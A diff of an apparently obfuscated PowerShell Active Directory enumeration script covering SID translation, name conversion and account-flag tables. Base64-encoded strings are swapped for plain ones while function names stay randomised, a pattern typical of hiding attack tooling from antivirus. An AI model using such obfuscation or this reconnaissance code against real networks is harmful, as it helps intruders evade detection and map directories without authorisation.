-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $ADNameArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $ADNameArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ADNameArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Domain']) { $ADNameArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }
+        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }
     }
 
     PROCESS {
         ForEach ($TargetSid in $ObjectSid) {
-            $TargetSid = $TargetSid.trim(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Kg=="))))
+            $TargetSid = $TargetSid.trim('*')
             try {
                 
                 Switch ($TargetSid) {
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTA=")))         { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TnVsbCBBdXRob3JpdHk="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTAtMA==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm9ib2R5"))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTE=")))         { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V29ybGQgQXV0aG9yaXR5"))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTEtMA==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXZlcnlvbmU="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTI=")))         { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG9jYWwgQXV0aG9yaXR5"))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTItMA==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG9jYWw="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTItMQ==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29uc29sZSBMb2dvbiA="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTM=")))         { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRvciBBdXRob3JpdHk="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTMtMA==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRvciBPd25lcg=="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTMtMQ==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRvciBHcm91cA=="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTMtMg==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRvciBPd25lciBTZXJ2ZXI="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTMtMw==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlYXRvciBHcm91cCBTZXJ2ZXI="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTMtNA==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3duZXIgUmlnaHRz"))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTQ=")))         { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm9uLXVuaXF1ZSBBdXRob3JpdHk="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTU=")))         { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TlQgQXV0aG9yaXR5"))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMQ==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGlhbHVw"))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMg==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmV0d29yaw=="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMw==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QmF0Y2g="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtNA==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW50ZXJhY3RpdmU="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtNg==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmljZQ=="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtNw==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QW5vbnltb3Vz"))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtOA==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJveHk="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtOQ==")))       { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RW50ZXJwcmlzZSBEb21haW4gQ29udHJvbGxlcnM="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMTA=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJpbmNpcGFsIFNlbGY="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMTE=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QXV0aGVudGljYXRlZCBVc2Vycw=="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMTI=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdHJpY3RlZCBDb2Rl"))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMTM=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGVybWluYWwgU2VydmVyIFVzZXJz"))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMTQ=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVtb3RlIEludGVyYWN0aXZlIExvZ29u"))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMTU=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGhpcyBPcmdhbml6YXRpb24g"))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMTc=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VGhpcyBPcmdhbml6YXRpb24g"))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMTg=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TG9jYWwgU3lzdGVt"))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMTk=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TlQgQXV0aG9yaXR5"))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMjA=")))      { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TlQgQXV0aG9yaXR5"))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtODAtMA==")))    { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxsIFNlcnZpY2VzIA=="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ0")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxBZG1pbmlzdHJhdG9ycw=="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ1")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxVc2Vycw=="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ2")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxHdWVzdHM="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ3")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxQb3dlciBVc2Vycw=="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ4")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxBY2NvdW50IE9wZXJhdG9ycw=="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTQ5")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxTZXJ2ZXIgT3BlcmF0b3Jz"))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTUw")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxQcmludCBPcGVyYXRvcnM="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTUx")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxCYWNrdXAgT3BlcmF0b3Jz"))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTUy")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxSZXBsaWNhdG9ycw=="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTU0")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxQcmUtV2luZG93cyAyMDAwIENvbXBhdGlibGUgQWNjZXNz"))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTU1")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxSZW1vdGUgRGVza3RvcCBVc2Vycw=="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTU2")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxOZXR3b3JrIENvbmZpZ3VyYXRpb24gT3BlcmF0b3Jz"))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTU3")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxJbmNvbWluZyBGb3Jlc3QgVHJ1c3QgQnVpbGRlcnM="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTU4")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxQZXJmb3JtYW5jZSBNb25pdG9yIFVzZXJz"))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTU5")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxQZXJmb3JtYW5jZSBMb2cgVXNlcnM="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTYw")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxXaW5kb3dzIEF1dGhvcml6YXRpb24gQWNjZXNzIEdyb3Vw"))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTYx")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxUZXJtaW5hbCBTZXJ2ZXIgTGljZW5zZSBTZXJ2ZXJz"))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTYy")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxEaXN0cmlidXRlZCBDT00gVXNlcnM="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTY5")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxDcnlwdG9ncmFwaGljIE9wZXJhdG9ycw=="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTcz")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxFdmVudCBMb2cgUmVhZGVycw=="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTc0")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxDZXJ0aWZpY2F0ZSBTZXJ2aWNlIERDT00gQWNjZXNz"))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTc1")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxSRFMgUmVtb3RlIEFjY2VzcyBTZXJ2ZXJz"))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTc2")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxSRFMgRW5kcG9pbnQgU2VydmVycw=="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTc3")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxSRFMgTWFuYWdlbWVudCBTZXJ2ZXJz"))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTc4")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxIeXBlci1WIEFkbWluaXN0cmF0b3Jz"))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTc5")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxBY2Nlc3MgQ29udHJvbCBBc3Npc3RhbmNlIE9wZXJhdG9ycw=="))) }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Uy0xLTUtMzItNTgw")))  { ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QlVJTFRJTlxBY2Nlc3MgQ29udHJvbCBBc3Npc3RhbmNlIE9wZXJhdG9ycw=="))) }
+                    'S-1-0'         { 'Null Authority' }
+                    'S-1-0-0'       { 'Nobody' }
+                    'S-1-1'         { 'World Authority' }
+                    'S-1-1-0'       { 'Everyone' }
+                    'S-1-2'         { 'Local Authority' }
+                    'S-1-2-0'       { 'Local' }
+                    'S-1-2-1'       { 'Console Logon ' }
+                    'S-1-3'         { 'Creator Authority' }
+                    'S-1-3-0'       { 'Creator Owner' }
+                    'S-1-3-1'       { 'Creator Group' }
+                    'S-1-3-2'       { 'Creator Owner Server' }
+                    'S-1-3-3'       { 'Creator Group Server' }
+                    'S-1-3-4'       { 'Owner Rights' }
+                    'S-1-4'         { 'Non-unique Authority' }
+                    'S-1-5'         { 'NT Authority' }
+                    'S-1-5-1'       { 'Dialup' }
+                    'S-1-5-2'       { 'Network' }
+                    'S-1-5-3'       { 'Batch' }
+                    'S-1-5-4'       { 'Interactive' }
+                    'S-1-5-6'       { 'Service' }
+                    'S-1-5-7'       { 'Anonymous' }
+                    'S-1-5-8'       { 'Proxy' }
+                    'S-1-5-9'       { 'Enterprise Domain Controllers' }
+                    'S-1-5-10'      { 'Principal Self' }
+                    'S-1-5-11'      { 'Authenticated Users' }
+                    'S-1-5-12'      { 'Restricted Code' }
+                    'S-1-5-13'      { 'Terminal Server Users' }
+                    'S-1-5-14'      { 'Remote Interactive Logon' }
+                    'S-1-5-15'      { 'This Organization ' }
+                    'S-1-5-17'      { 'This Organization ' }
+                    'S-1-5-18'      { 'Local System' }
+                    'S-1-5-19'      { 'NT Authority' }
+                    'S-1-5-20'      { 'NT Authority' }
+                    'S-1-5-80-0'    { 'All Services ' }
+                    'S-1-5-32-544'  { 'BUILTIN\Administrators' }
+                    'S-1-5-32-545'  { 'BUILTIN\Users' }
+                    'S-1-5-32-546'  { 'BUILTIN\Guests' }
+                    'S-1-5-32-547'  { 'BUILTIN\Power Users' }
+                    'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
+                    'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
+                    'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
+                    'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
+                    'S-1-5-32-552'  { 'BUILTIN\Replicators' }
+                    'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
+                    'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
+                    'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
+                    'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
+                    'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
+                    'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
+                    'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
+                    'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
+                    'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
+                    'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
+                    'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
+                    'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
+                    'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
+                    'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
+                    'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
+                    'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
+                    'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
+                    'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                     Default {
-                        vqxllx -Identity $TargetSid @ADNameArguments
+                        jjxazw -Identity $TargetSid @ADNameArguments
                     }
                 }
             }
             catch {
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0NvbnZlcnRGcm9tLVNJRF0gRXJyb3IgY29udmVydGluZyBTSUQgJyRUYXJnZXRTaWQnIDogezB9"))) -f $_)
+                Write-Verbose ("[ConvertFrom-SID] Error converting SID '$TargetSid' : {0}" -f $_)
             }
         }
     }
 }
 
 
-function vqxllx {
+function jjxazw {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
@@ -1095,30 +1099,30 @@ function vqxllx {
         }
 
         
-        function muddby([__ComObject] $Object, [String] $Method, $Parameters) {
+        function gihvjp([__ComObject] $Object, [String] $Method, $Parameters) {
             $Output = $Null
-            $Output = $Object.GetType().InvokeMember($Method, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW52b2tlTWV0aG9k"))), $NULL, $Object, $Parameters)
+            $Output = $Object.GetType().InvokeMember($Method, 'InvokeMethod', $NULL, $Object, $Parameters)
             Write-Output $Output
         }
 
-        function ozycrp([__ComObject] $Object, [String] $Property) {
-            $Object.GetType().InvokeMember($Property, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0UHJvcGVydHk="))), $NULL, $Object, $NULL)
+        function yckpek([__ComObject] $Object, [String] $Property) {
+            $Object.GetType().InvokeMember($Property, 'GetProperty', $NULL, $Object, $NULL)
         }
 
-        function fgporq([__ComObject] $Object, [String] $Property, $Parameters) {
-            [Void] $Object.GetType().InvokeMember($Property, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2V0UHJvcGVydHk="))), $NULL, $Object, $Parameters)
+        function xgbflg([__ComObject] $Object, [String] $Property, $Parameters) {
+            [Void] $Object.GetType().InvokeMember($Property, 'SetProperty', $NULL, $Object, $Parameters)
         }
 
         
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) {
+        if ($PSBoundParameters['Server']) {
             $ADSInitType = 2
             $InitName = $Server
         }
-        elseif ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) {
+        elseif ($PSBoundParameters['Domain']) {
             $ADSInitType = 1
             $InitName = $Domain
         }
-        elseif ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
+        elseif ($PSBoundParameters['Credential']) {
             $Cred = $Credential.GetNetworkCredential()
             $ADSInitType = 1
             $InitName = $Cred.Domain
@@ -1132,12 +1136,12 @@ function vqxllx {
 
     PROCESS {
         ForEach ($TargetIdentity in $Identity) {
-            if (-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3V0cHV0VHlwZQ==")))]) {
-                if ($TargetIdentity -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XltBLVphLXpdK1xcW0EtWmEteiBdKw==")))) {
-                    $ADSOutputType = $NameTypes[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWluU2ltcGxl")))]
+            if (-not $PSBoundParameters['OutputType']) {
+                if ($TargetIdentity -match "^[A-Za-z]+\\[A-Za-z ]+") {
+                    $ADSOutputType = $NameTypes['DomainSimple']
                 }
                 else {
-                    $ADSOutputType = $NameTypes[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TlQ0")))]
+                    $ADSOutputType = $NameTypes['NT4']
                 }
             }
             else {
@@ -1146,11 +1150,11 @@ function vqxllx {
 
             $Translate = New-Object -ComObject NameTranslate
 
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
+            if ($PSBoundParameters['Credential']) {
                 try {
                     $Cred = $Credential.GetNetworkCredential()
 
-                    muddby $Translate ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5pdEV4"))) (
+                    gihvjp $Translate 'InitEx' (
                         $ADSInitType,
                         $InitName,
                         $Cred.UserName,
@@ -1159,38 +1163,38 @@ function vqxllx {
                     )
                 }
                 catch {
-                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0NvbnZlcnQtQUROYW1lXSBFcnJvciBpbml0aWFsaXppbmcgdHJhbnNsYXRpb24gZm9yICckSWRlbnRpdHknIHVzaW5nIGFsdGVybmF0ZSBjcmVkZW50aWFscyA6IHswfQ=="))) -f $_)
+                    Write-Verbose ("[Convert-ADName] Error initializing translation for '$Identity' using alternate credentials : {0}" -f $_)
                 }
             }
             else {
                 try {
-                    $Null = muddby $Translate ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5pdA=="))) (
+                    $Null = gihvjp $Translate 'Init' (
                         $ADSInitType,
                         $InitName
                     )
                 }
                 catch {
-                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0NvbnZlcnQtQUROYW1lXSBFcnJvciBpbml0aWFsaXppbmcgdHJhbnNsYXRpb24gZm9yICckSWRlbnRpdHknIDogezB9"))) -f $_)
+                    Write-Verbose ("[Convert-ADName] Error initializing translation for '$Identity' : {0}" -f $_)
                 }
             }
 
             
-            fgporq $Translate ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2hhc2VSZWZlcnJhbA=="))) (0x60)
+            xgbflg $Translate 'ChaseReferral' (0x60)
 
             try {
                 
-                $Null = muddby $Translate ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2V0"))) (8, $TargetIdentity)
-                muddby $Translate ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0"))) ($ADSOutputType)
+                $Null = gihvjp $Translate 'Set' (8, $TargetIdentity)
+                gihvjp $Translate 'Get' ($ADSOutputType)
             }
             catch [System.Management.Automation.MethodInvocationException] {
-                Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0NvbnZlcnQtQUROYW1lXSBFcnJvciB0cmFuc2xhdGluZyAnJFRhcmdldElkZW50aXR5JyA6IHswfQ=="))) -f $($_.Exception.InnerException.Message))
+                Write-Verbose ("[Convert-ADName] Error translating '$TargetIdentity' : {0}" -f $($_.Exception.InnerException.Message))
             }
         }
     }
 }
 
 
-function aupief {
+function cudvgr {
 
 
     [OutputType('System.Collections.Specialized.OrderedDictionary')]
@@ -1208,28 +1212,28 @@ function aupief {
     BEGIN {
         
         $UACValues = New-Object System.Collections.Specialized.OrderedDictionary
-        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U0NSSVBU"))), 1)
-        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QUNDT1VOVERJU0FCTEU="))), 2)
-        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SE9NRURJUl9SRVFVSVJFRA=="))), 8)
-        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TE9DS09VVA=="))), 16)
-        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UEFTU1dEX05PVFJFUUQ="))), 32)
-        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UEFTU1dEX0NBTlRfQ0hBTkdF"))), 64)
-        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RU5DUllQVEVEX1RFWFRfUFdEX0FMTE9XRUQ="))), 128)
-        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VEVNUF9EVVBMSUNBVEVfQUNDT1VOVA=="))), 256)
-        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tk9STUFMX0FDQ09VTlQ="))), 512)
-        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SU5URVJET01BSU5fVFJVU1RfQUNDT1VOVA=="))), 2048)
-        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("V09SS1NUQVRJT05fVFJVU1RfQUNDT1VOVA=="))), 4096)
-        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U0VSVkVSX1RSVVNUX0FDQ09VTlQ="))), 8192)
-        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RE9OVF9FWFBJUkVfUEFTU1dPUkQ="))), 65536)
-        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TU5TX0xPR09OX0FDQ09VTlQ="))), 131072)
-        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U01BUlRDQVJEX1JFUVVJUkVE"))), 262144)
-        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VFJVU1RFRF9GT1JfREVMRUdBVElPTg=="))), 524288)
-        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tk9UX0RFTEVHQVRFRA=="))), 1048576)
-        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VVNFX0RFU19LRVlfT05MWQ=="))), 2097152)
-        $UACValues.Add(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RE9OVF9SRVFfUFJFQVVUSA=="))), 4194304)
